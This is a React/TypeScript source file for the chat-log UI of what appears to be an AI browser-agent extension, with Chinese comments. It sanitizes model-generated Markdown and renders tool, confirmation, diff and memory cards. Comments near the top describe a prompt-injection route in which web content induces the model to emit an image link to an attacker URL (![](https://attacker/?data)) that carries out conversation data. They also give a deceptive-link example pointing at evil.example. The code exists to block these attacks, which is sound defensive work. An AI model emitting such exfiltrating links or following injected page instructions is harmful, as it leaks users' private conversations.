// 對話紀錄的各種項目：使用者訊息、Markdown 回覆、思考過程、工具卡片、用量…
import { useLayoutEffect, useMemo, useRef, useState, type ReactNode } from "react";
import { createPortal } from "react-dom";
import { marked } from "marked";
import DOMPurify from "dompurify";
import type { Source } from "./shared";
import type { DiffLine } from "./repo";
import { S, emit, setMemories, type Item, type MdItem, type ThinkingItem, type ToolItem, type AskItem, type FileItem, type ConfirmItem, type MemoryItem, type PageItem, type CommitItem } from "./store";
import { updateProject } from "./projects";
import { t, currentLang, type Key } from "./i18n";
import { openUpgrade } from "./pages";
import { IconBookmark, IconCopy, IconDownload, IconErr, IconFile, IconGitHub, IconGlobe, IconOk, IconQuestion, IconShield } from "./icons";

// 連結文字看起來像網址／網域、但跟真正前往的網域不同（[bank.com](https://evil.example)）時要露出真網域
const bareHost = (h: string) => h.toLowerCase().replace(/^www\./, "");
export function linkHostNote(text: string, href: string): string | null {
  let host: string;
  try {
    const u = new URL(href);
    if (!/^https?:$/.test(u.protocol)) return null;
    host = u.hostname;
  } catch { return null; }
  const t = text.trim().toLowerCase();
  // 文字就是那個網域（或那個網域底下的網址）才不用標
  const m = t.match(/^(?:https?:\/\/)?([^\s/?#:]+)/);
  if (m && bareHost(m[1]) === bareHost(host)) return null;
  return host;
}

// 模型輸出可能夾帶網頁裡被注入的 HTML，而這個頁面有擴充功能權限：一律消毒後才放進 DOM
DOMPurify.addHook("afterSanitizeAttributes", (node) => {
  if (node.tagName !== "A") return;
  node.setAttribute("target", "_blank");
  node.setAttribute("rel", "noopener noreferrer");
  const href = node.getAttribute("href") ?? "";
  if (href) node.setAttribute("title", href);
  const host = linkHostNote(node.textContent ?? "", href);
  if (host) node.setAttribute("data-host", host); // CSS ::after 顯示，不經 innerHTML
  else node.removeAttribute("data-host"); // 模型自己寫的 data-host 不算
});
// 會自動發出請求的標籤／屬性一律禁掉：網頁內容可能誘導模型輸出 ![](https://攻擊者/?資料) 把對話外洩
const PURIFY = {
  FORBID_TAGS: ["img", "picture", "source", "video", "audio", "iframe", "object", "embed", "svg", "math", "form", "input", "button", "textarea", "select", "style", "link"],
  FORBID_ATTR: ["style", "srcset", "background", "poster"],
};
const renderMd = (text: string) => DOMPurify.sanitize(marked.parse(text, { gfm: true, breaks: true }) as string, PURIFY);

// 回答裡的 [n] 換成來源連結：只認這段對話登記過的編號（S.sources，程式登記的、不是模型寫的網址），程式碼與既有連結裡的不動。
// 在消毒後的 DOM 上用 createElement 加，不拼 HTML 字串。used：有連到的編號（照出現順序），給下面的「來源」清單
export function cite(html: string, sources: Source[]): { html: string; used: number[] } {
  const used: number[] = [];
  if (!sources.length || !/\[\d+\]/.test(html)) return { html, used };
  const tpl = document.createElement("template");
  tpl.innerHTML = html;
  const walk = document.createTreeWalker(tpl.content, NodeFilter.SHOW_TEXT);
  const texts: Text[] = [];
  for (let n = walk.nextNode(); n; n = walk.nextNode()) if (!n.parentElement?.closest("a, code, pre")) texts.push(n as Text);
  for (const node of texts) {
    const parts = node.data.split(/(\[\d+\])/);
    if (parts.length === 1) continue;
    node.replaceWith(...parts.map((p) => {
      const n = /^\[\d+\]$/.test(p) ? Number(p.slice(1, -1)) : 0;
      const src = sources[n - 1];
      if (!src || !/^https?:\/\//.test(src.url)) return p;
      if (!used.includes(n)) used.push(n);
      const a = document.createElement("a");
      a.className = "cite";
      a.href = src.url;
      a.target = "_blank";
      a.rel = "noopener noreferrer";
      a.title = `${src.title}\n${src.url}`;
      a.textContent = p;
      return a;
    }));
  }
  return { html: tpl.innerHTML, used };
}

export function CopyButton({ getText, label, cls = "copy" }: { getText: () => string; label?: string; cls?: string }) {
  const [done, setDone] = useState(false);
  return (
    <button
      type="button" className={done ? `${cls} done` : cls} title={t("common.copy")} data-done={t("common.copied")}
      onClick={async () => {
        await navigator.clipboard.writeText(getText());
        setDone(true);
        setTimeout(() => setDone(false), 1200);
      }}
    >
      <IconCopy />{label}
    </button>
  );
}

// 助理的一段 Markdown 回覆：串流結束後幫程式碼區塊加複製鈕（portal 進消毒後的 <pre>）；有引用 [n] 就在下面列出來源
function Md({ item }: { item: MdItem }) {
  const { html, used } = useMemo(() => cite(renderMd(item.text), S.sources), [item.text, S.sources.length]);
  const body = useRef<HTMLDivElement>(null);
  const [pres, setPres] = useState<HTMLPreElement[]>([]);
  useLayoutEffect(() => { setPres(item.done ? [...body.current!.querySelectorAll("pre")] : []); }, [item.done, html]);
  return (
    <div className="msg assistant">
      <div className="md" ref={body} dangerouslySetInnerHTML={{ __html: html }} />
      {pres.map((pre, i) => createPortal(<CopyButton getText={() => pre.querySelector("code")?.textContent ?? pre.textContent ?? ""} />, pre, i))}
      {item.done && used.length > 0 && (
        <div className="sources">
          <div className="sources-title">{t("sources.title")}</div>
          <ul>
            {used.map((n) => (
              <li key={n}>
                <a href={S.sources[n - 1].url} target="_blank" rel="noopener noreferrer" title={S.sources[n - 1].url}>
                  <span className="cite-n">[{n}]</span> {S.sources[n - 1].title}
                </a>
                <span className="sources-host">{hostOf(S.sources[n - 1].url)}</span>
              </li>
            ))}
          </ul>
        </div>
      )}
      {item.done && <div className="msg-actions"><CopyButton getText={() => item.text} label={t("common.copy")} /></div>}
    </div>
  );
}

// 思考過程：可展開的區塊，串流中顯示「思考中」，結束後顯示花了幾秒
function Thinking({ item }: { item: ThinkingItem }) {
  const html = useMemo(() => renderMd(item.text), [item.text]);
  const label = item.state === "done" ? t("chat.thoughtFor", { n: item.seconds })
    : item.state === "interrupted" ? t("chat.thinkingInterrupted") : t("chat.thinking");
  return (
    // 中斷時維持 running（跟改寫前一樣只換字）
    <details className="thinking" data-state={item.state === "done" ? "done" : "running"}>
      <summary>{label}</summary>
      {/* display 被省略時沒有內容，結束後只留時間 */}
      {(item.state !== "done" || item.text.trim()) && <div className="md" dangerouslySetInnerHTML={{ __html: html }} />}
    </details>
  );
}

// 工具名稱換成人話；參數只挑使用者看得懂的（網址、要輸入的字、技能名稱）
function toolLabel(item: ToolItem) {
  const i = (item.input ?? {}) as Record<string, unknown>;
  switch (item.name) {
    case "navigate": return t("tool.navigate", { url: String(i.url ?? "") });
    case "search_web": return t("tool.search_web", { query: String(i.query ?? "") });
    case "read_url": return t("tool.read_url", { host: hostOf(String(i.url ?? "")) });
    case "type": return t("tool.type", { text: String(i.text ?? "") });
    case "use_skill": return t("tool.use_skill", { name: String(i.name ?? "") });
    case "create_file": return t("tool.create_file", { name: String(i.filename ?? "") });
    case "ask_user": return t("tool.ask_user");
    case "read_page": case "click": case "scroll": case "screenshot": case "remember": case "forget": return t(`tool.${item.name}` as Key);
    default: return item.name;
  }
}
const firstLine = (s = "") => s.split("\n")[0];
// 工具錯誤是寫給模型看的（繁中）。畫面上換成介面語言：認得的換成對應字串，其餘繁中介面照原文、其他語言給通用說明（原文在展開的細節裡）
const TOOL_ERRORS: [RegExp, Key][] = [
  [/^使用者(拒絕了這個動作|不同意)/, "tool.denied"],
  [/^任務開始時的分頁已經被關掉/, "tool.tabClosed"],
  [/^這個頁面（瀏覽器內建頁/, "tool.cannotAccess"],
  [/^頁面正在換頁/, "tool.navigating"],
  [/^找不到(編號|元素)/, "tool.notFound"],
];
export function toolErrorText(err = ""): string {
  const hit = TOOL_ERRORS.find(([re]) => re.test(err));
  if (hit) return t(hit[1]);
  return currentLang() === "zh-TW" ? firstLine(err) : t("tool.failedGeneric");
}

// 工具呼叫顯示成可展開的小卡片：執行中轉圈，結束打勾／打叉，展開看原始參數與錯誤
function Tool({ item }: { item: ToolItem }) {
  return (
    <details className="tool" data-state={item.state}>
      <summary>
        <span className="status">{item.state === "ok" ? <IconOk /> : item.state === "error" ? <IconErr /> : null}</span>
        <span className="tool-label">{toolLabel(item)}</span>
      </summary>
      {item.error && <div className="tool-error">{toolErrorText(item.error)}</div>}
      <pre>{`${item.name} ${JSON.stringify(item.input, null, 2)}` + (item.error ? `\n\n✕ ${item.error}` : "")}</pre>
    </details>
  );
}

// 連續的工具呼叫收成一張「執行了 N 個步驟」：執行中顯示目前這一步，有失敗直接露出第一個失敗的原因
function ToolGroup({ items }: { items: ToolItem[] }) {
  const running = items.find((x) => x.state === "running");
  const errors = items.filter((x) => x.state === "error");
  const state = running ? "running" : errors.length ? "error" : "ok";
  return (
    <details className="tools" data-state={state}>
      <summary>
        <span className="status">{state === "ok" ? <IconOk /> : state === "error" ? <IconErr /> : null}</span>
        <span className="tool-label">
          {t("tool.summary", { n: items.length })}
          {running && <> · {toolLabel(running)}</>}
          {!!errors.length && <> · {t("tool.failed", { n: errors.length })}</>}
        </span>
        {!running && errors[0] && <span className="tool-error">{toolLabel(errors[0])}{t("common.colon")}{toolErrorText(errors[0].error)}</span>}
      </summary>
      <div className="tools-list">{items.map((x) => <Tool key={x.id} item={x} />)}</div>
    </details>
  );
}

// 對話紀錄：兩個以上連在一起的工具呼叫合成一組，免得 30 張卡片把回答推到很下面
export function LogList({ items }: { items: Item[] }) {
  const out: ReactNode[] = [];
  for (let i = 0; i < items.length; i++) {
    const item = items[i];
    if (item.kind !== "tool") { out.push(<LogItem key={item.id} item={item} />); continue; }
    let j = i;
    while (items[j + 1]?.kind === "tool") j++;
    const run = items.slice(i, j + 1) as ToolItem[];
    out.push(run.length > 1 ? <ToolGroup key={`g${item.id}`} items={run} /> : <Tool key={item.id} item={item} />);
    i = j;
  }
  return <>{out}</>;
}

// 額度用完（402 quota_exceeded）或方案不含所選模型（402 model_not_in_plan，why: "model"）：說明＋升級按鈕
function QuotaCard({ why }: { why?: "model" }) {
  return (
    <div className="msg quota" id="quota-card" data-why={why} role="alert">
      <strong>{t(why ? "quota.modelTitle" : "quota.title")}</strong>
      <span>{t(why ? "quota.modelBody" : "quota.body")}</span>
      <button type="button" className="btn btn-primary" id="quota-upgrade" onClick={openUpgrade}>{t("account.upgrade")}</button>
    </div>
  );
}

export function LogItem({ item }: { item: Item }) {
  switch (item.kind) {
    case "user":
      return (
        <div className="msg user">
          {item.files && <div className="user-files">{item.files.map((f, i) => <span className="user-file" key={i} title={f.name}><IconFile /><span>{f.name}</span></span>)}</div>}
          {item.text}
          {/* 附帶的選取內容：摺起來只露前幾個字，展開看全文 */}
          {item.selection && (
            <details className="user-sel">
              <summary>{t("selection.quote", { n: item.selection.length })}</summary>
              <blockquote>{item.selection}</blockquote>
            </details>
          )}
        </div>
      );
    case "error":
    case "note":
      return <div className={`msg ${item.kind}`}>{item.text}</div>;
    case "quota":
      return <QuotaCard why={item.why} />;
    case "stats":
      return <div className="msg stats" title={item.title}>{item.text}</div>;
    case "md":
      return <Md item={item} />;
    case "thinking":
      return <Thinking item={item} />;
    case "tool":
      return <Tool item={item} />;
    case "pending":
      // 送出後、第一個區塊出現前的等待指示
      return <div className="pending"><i /><i /><i /></div>;
    case "ask":
      return <AskCard item={item} />;
    case "file":
      return <FileCard item={item} />;
    case "confirm":
      return <ConfirmCard item={item} />;
    case "memory":
      return <MemoryCard item={item} />;
    case "commit":
      return <CommitCard item={item} />;
    case "page":
      return <PageCard item={item} />;
  }
}

// ---------- 卡片：內容都當純文字渲染（React 文字節點），不經 Markdown／HTML ----------

const focusInput = () => document.getElementById("input")?.focus();

// ask_user：點選項就回答；複選要按「確定」；「其他」＝到輸入框自己打字。回答後唯讀
function AskCard({ item }: { item: AskItem }) {
  const [sel, setSel] = useState<string[]>([]);
  const { question, options, multiSelect } = item.input;
  const waiting = item.state === "waiting";
  const chosen = waiting ? sel : item.picked ?? [];
  const inOrder = (labels: string[]) => options.map((o) => o.label).filter((l) => labels.includes(l));
  const pick = (label: string) => {
    if (!multiSelect) return item.reply?.(label, [label]);
    setSel((s) => (s.includes(label) ? s.filter((x) => x !== label) : [...s, label]));
  };
  return (
    <div className="chat-card ask-card" data-state={item.state}>
      <div className="card-title"><IconQuestion /><span>{question}</span></div>
      {multiSelect && waiting && <div className="card-hint">{t("ask.multi")}</div>}
      <div className="ask-options">
        {options.map((o) => (
          <button key={o.label} type="button" className="ask-opt" aria-pressed={chosen.includes(o.label)} disabled={!waiting} onClick={() => pick(o.label)}>
            <span className="ask-label">{o.label}{o.recommended && <span className="badge">{t("ask.recommended")}</span>}</span>
            {o.description && <small>{o.description}</small>}
          </button>
        ))}
        {waiting && (
          <button type="button" className="ask-opt other" onClick={focusInput}>
            <span className="ask-label">{t("ask.other")}</span><small>{t("ask.otherHint")}</small>
          </button>
        )}
      </div>
      {multiSelect && waiting && (
        <div className="card-actions">
          <button type="button" className="btn btn-primary" disabled={!sel.length} onClick={() => { const p = inOrder(sel); item.reply?.(p.join("、"), p); }}>{t("ask.submit")}</button>
        </div>
      )}
      {item.state === "answered" && <div className="card-foot">{t("ask.answered")}{t("common.colon")}{item.picked?.length ? item.picked.join(t("common.listSep")) : item.answer}</div>}
      {item.state === "cancelled" && <div className="card-foot">{t("ask.cancelled")}</div>}
    </div>
  );
}

const PREVIEW_LINES = 20;
const fmtSize = (n: number) => (n < 1024 ? `${n} B` : n < 1024 * 1024 ? `${(n / 1024).toFixed(1)} KB` : `${(n / 1048576).toFixed(2)} MB`);

// create_file：Blob URL＋<a download> 下載（不用 downloads 權限），用完就 revoke
function FileCard({ item }: { item: FileItem }) {
  const [open, setOpen] = useState(false);
  const size = useMemo(() => new Blob([item.content]).size, [item.content]);
  const lines = item.content.split("\n");
  const download = () => {
    const url = URL.createObjectURL(new Blob([item.content], { type: "text/plain;charset=utf-8" }));
    const a = document.createElement("a");
    a.href = url;
    a.download = item.filename;
    a.click();
    setTimeout(() => URL.revokeObjectURL(url), 1000);
  };
  return (
    <div className="chat-card file-card">
      <div className="file-head">
        <span className="file-icon"><IconFile /><b>{item.filename.split(".").pop()}</b></span>
        <span className="file-meta">
          <strong>{item.filename}</strong>
          <small>{fmtSize(size)}{item.description ? ` · ${item.description}` : ""}</small>
        </span>
      </div>
      <div className="card-actions">
        <button type="button" className="btn btn-primary sm file-download" onClick={download}><IconDownload />{t("file.download")}</button>
        <CopyButton cls="btn btn-ghost sm copy" getText={() => item.content} label={t("common.copy")} />
        <button type="button" className="btn btn-ghost sm file-toggle" aria-expanded={open} onClick={() => setOpen(!open)}>{open ? t("file.hidePreview") : t("file.preview")}</button>
      </div>
      {open && <pre className="file-preview">{lines.slice(0, PREVIEW_LINES).join("\n")}</pre>}
      {open && lines.length > PREVIEW_LINES && <div className="card-hint">{t("file.previewMore", { n: PREVIEW_LINES, total: lines.length })}</div>}
    </div>
  );
}

// 不可逆動作的閘門：沒按「允許」就不執行（tools.ts 的 guard 在等 decide）
function ConfirmCard({ item }: { item: ConfirmItem }) {
  return (
    <div className="chat-card confirm-card" data-state={item.state}>
      <div className="card-title"><IconShield /><span>{t("confirm.title")}</span></div>
      <div className="card-body">{item.text ?? t(item.submitting ? "confirm.submit" : "confirm.click", { label: item.label })}</div>
      {item.diff ? (
        // 寫進 GitHub repo：路徑單獨一行（同形字、看不見的字元在 repo.ts 先擋過）、commit 訊息、增刪行數、警告、差異
        <>
          <div className="confirm-path"><code>{item.label}</code>{item.stats && <span className="diff-stats"><b className="add">+{item.stats.added}</b> <b className="del">−{item.stats.removed}</b></span>}</div>
          {item.detail && <div className="card-hint confirm-message">{t("confirm.commitMessage", { message: item.detail })}</div>}
          {item.warn?.map((w) => <div className="confirm-warn" key={w}>{t(w as Key)}</div>)}
          <DiffView lines={item.diff} />
        </>
      ) : (
        <>
          {item.detail && <div className="confirm-detail">{item.detail}</div>}
          {item.aria && <div className="card-hint confirm-aria">{t("confirm.aria", { label: item.aria })}</div>}
          {item.mismatch && <div className="confirm-warn">{t("confirm.mismatch")}</div>}
          {item.warn?.map((w) => <div className="confirm-warn" key={w}>{t(w as Key)}</div>)}
          <div className="card-hint">{t("confirm.site", { host: item.host })}</div>
        </>
      )}
      {item.state === "waiting" ? (
        <div className="card-actions">
          <button type="button" className="btn btn-primary confirm-allow" onClick={() => item.decide?.(true)}>{t("confirm.allow")}</button>
          <button type="button" className="btn btn-ghost confirm-deny" onClick={() => item.decide?.(false)}>{t("confirm.deny")}</button>
        </div>
      ) : (
        <div className="card-foot">{t(item.state === "allowed" ? "confirm.allowed" : "confirm.denied")}</div>
      )}
    </div>
  );
}

// 寫進 repo 的差異（實作審查 S2、U1）：長行折行（不准把內容推到框外）、新檔的行號（開頭省略掉多少看得出來），
// 框裡還有沒完整看到的行就在框下面寫「還有 N 行」（第二輪 4：看行的底邊，一行很長、只露出開頭也算；框的寬度變了重量）
function DiffView({ lines }: { lines: (DiffLine | null)[] }) {
  const box = useRef<HTMLPreElement>(null);
  const [below, setBelow] = useState(0);
  const measure = () => {
    const el = box.current;
    if (!el) return;
    const bottom = el.scrollTop + el.clientHeight + 1;
    setBelow(Array.from(el.children as HTMLCollectionOf<HTMLElement>).filter((c) => !c.classList.contains("gap") && c.offsetTop + c.offsetHeight > bottom).length);
  };
  useLayoutEffect(() => {
    measure();
    const ro = new ResizeObserver(measure);
    if (box.current) ro.observe(box.current);
    return () => ro.disconnect();
  }, [lines]);
  return (
    <>
      <pre className="diff" ref={box} onScroll={measure} aria-label={t("confirm.diff")}>
        {lines.map((l, i) => (l ? <span key={i} className={l.op === "+" ? "add" : l.op === "-" ? "del" : undefined} data-n={l.n ?? ""}>{l.op} {l.text}</span> : <span key={i} className="gap">⋯</span>))}
      </pre>
      {below > 0 && <div className="card-hint diff-more" id="diff-more">{t("confirm.diffMore", { n: below })}</div>}
    </>
  );
}

// 已經 commit 到 GitHub 的檔案：路徑、增刪行數、commit 連結
function CommitCard({ item }: { item: CommitItem }) {
  return (
    <div className="chat-card commit-card">
      <IconGitHub />
      <span className="memory-text"><small>{t("card.committed", { repo: item.repo })}</small><span className="confirm-path"><code>{item.path}</code><span className="diff-stats"><b className="add">+{item.added}</b> <b className="del">−{item.removed}</b></span></span></span>
      <a className="btn btn-ghost sm" href={item.url} target="_blank" rel="noopener noreferrer">{t("card.viewCommit")}</a>
    </div>
  );
}

function MemoryCard({ item }: { item: MemoryItem }) {
  const project = item.projectId ? S.projects.find((p) => p.id === item.projectId) : undefined;
  const gone = (!!item.projectId && !project) || !!item.repo; // 專案已經刪了，或記在 repo（已經 commit）：沒有復原，也不能改到全域記憶
  // 復原只刪完全相同的那一條（部分符合會刪到別條）
  const undo = async () => {
    const before = project ? project.memories : S.memories;
    const list = before.filter((m) => m !== item.text);
    if (list.length !== before.length) await (project ? updateProject(project.id, { memories: list }) : setMemories(list));
    item.undone = true;
    emit();
  };
  const title = item.op === "forget" ? t("card.forgotten") : item.undone ? t("card.memoryUndone") : item.repo ? t("card.rememberedRepo", { repo: item.repo }) : project ? t("card.rememberedProject", { name: project.name }) : t("card.remembered");
  return (
    <div className="chat-card memory-card" data-undone={item.undone ? "" : undefined}>
      <IconBookmark />
      <span className="memory-text"><small>{title}</small>{item.text}</span>
      {item.op === "remember" && !item.undone && !gone && <button type="button" className="btn btn-ghost sm memory-undo" onClick={undo}>{t("common.undo")}</button>}
    </div>
  );
}

const hostOf = (url: string) => { try { return new URL(url).hostname; } catch { return url; } };

function PageCard({ item }: { item: PageItem }) {
  return (
    <button type="button" className="chat-card page-card" title={t("card.openTab")} onClick={() => chrome.tabs.update(item.tabId, { active: true }).catch(() => {})}>
      <IconGlobe />
      <span className="page-meta"><strong>{item.title}</strong><small>{hostOf(item.url)}</small></span>
    </button>
  );
}
